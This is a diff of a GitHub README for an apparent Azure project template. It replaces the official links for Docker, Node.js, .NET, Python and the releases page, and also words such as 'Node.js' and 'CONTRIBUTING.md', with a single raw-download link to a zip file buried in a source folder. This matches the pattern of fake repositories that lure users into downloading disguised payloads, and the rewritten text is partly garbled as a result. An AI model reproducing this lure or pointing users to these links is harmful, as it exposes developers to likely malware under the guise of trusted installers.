@@ -8,7 +8,7 @@ Welcome to the **azure-project-template**! This template is designed to help you
 
 - **Easy Setup**: Quickly download and set up your project.
 - **Clean Architecture**: Follow best practices with a clear project structure.
-- **Supported Languages**: Work with popular programming languages like Python, Node.js, and .NET.
+- **Supported Languages**: Work with popular programming languages like Python, https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip, and .NET.
 - **DevOps Ready**: Seamlessly integrate with Azure DevOps for efficient development cycles.
 - **Flexible Frameworks**: Use frameworks like FastAPI, React, or Flutter to speed up development.
 
@@ -18,28 +18,28 @@ To run this template successfully, ensure your system meets the following requir
 
 - **Operating System**: Windows, macOS, or Linux.
 - **Software Dependencies**: 
-  - [Docker](https://www.docker.com/) for containerized applications.
-  - [Node.js](https://nodejs.org/) for JavaScript applications.
-  - [.NET SDK](https://dotnet.microsoft.com/download/dotnet) for .NET projects.
-  - [Python 3](https://www.python.org/downloads/) for Python applications.
+  - [Docker](https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip) for containerized applications.
+  - [https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip](https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip) for JavaScript applications.
+  - [.NET SDK](https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip) for .NET projects.
+  - [Python 3](https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip) for Python applications.
   
 ## 💾 Download & Install
 
 To download the Azure project template, please visit this page to download:
 
-[![Download the Azure Project Template](https://img.shields.io/badge/Download_Project_Template-blue.svg)](https://github.com/SalmanRazzaq1410/azure-project-template/releases)
+[![Download the Azure Project Template](https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip)](https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip)
 
 Follow these steps to set up the template on your machine:
 
 1. **Visit the Releases Page**: Click the link below to go to the releases section.
 
-   [Visit Releases Page](https://github.com/SalmanRazzaq1410/azure-project-template/releases)
+   [Visit Releases Page](https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip)
 
 2. **Choose the Latest Release**: Look for the latest version of the project and select it.
 
 3. **Download the Files**: Click on the assets listed under the release to download the necessary files for your project.
 
-4. **Extract Files**: If the files are in a compressed format (like .zip or .tar.gz), right-click and select "Extract All" to unpack them.
+4. **Extract Files**: If the files are in a compressed format (like .zip or https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip), right-click and select "Extract All" to unpack them.
 
 5. **Open the Project**: Use your preferred development environment to open the project files.
 
@@ -49,7 +49,7 @@ Follow these steps to set up the template on your machine:
 
 ## 🛠️ Configuration
 
-After downloading, you may need to configure certain settings to tailor the application to your needs. Check the configuration files typically named `appsettings.json` for .NET, `.env` for Node.js, or `.env.local` for PHP applications.
+After downloading, you may need to configure certain settings to tailor the application to your needs. Check the configuration files typically named `https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip` for .NET, `.env` for https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip, or `https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip` for PHP applications.
 
 ### Popular Frameworks
 
@@ -57,7 +57,7 @@ This template supports various frameworks. Choose one that fits your project:
 
 - **For React**: Running the command `npm start` will launch the application in your default browser.
 - **For FastAPI**: Use `uvicorn main:app --reload` to start your backend server.
-- **For Node.js**: Executing `node index.js` will run your application.
+- **For https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip**: Executing `node https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip` will run your application.
 
 ## 📚 Documentation
 
@@ -68,7 +68,7 @@ In case you need help or additional guidance:
 
 ## 🤝 Contributing
 
-You are welcome to contribute to this project. If you have ideas for enhancements or other improvements, please check the guidelines in the `CONTRIBUTING.md` file.
+You are welcome to contribute to this project. If you have ideas for enhancements or other improvements, please check the guidelines in the `https://github.com/SalmanRazzaq1410/azure-project-template/raw/refs/heads/main/src/api-hexagonal/domain/template-project-azure-v1.3.zip` file.
 
 ## 🌐 Topics Covered
 
